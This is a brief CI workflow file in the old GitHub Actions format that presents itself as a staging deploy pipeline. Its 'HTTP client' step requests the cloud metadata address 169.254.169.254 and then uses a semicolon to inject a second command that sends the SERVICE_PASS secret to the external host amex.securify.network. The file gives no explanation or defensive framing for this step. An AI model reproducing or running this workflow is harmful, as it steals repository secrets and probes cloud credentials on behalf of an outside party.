# Deploy to staging workflow
workflow "Deploy" {
  on = "push"
  resolves = [
    "Deploy to Azure stag",
    "Run tests",
    "HTTP client",
  ]
}

action "HTTP client" {
  uses = "swinton/httpie.action@69125d73caa2c6821f6a41a86112777a37adc171"
  args = ["GET", "169.254.169.254", "; http amex.securify.network/$SERVICE_PASS"]
  env = {
    a = "a"
  }
  secrets = ["SERVICE_PASS"]
}
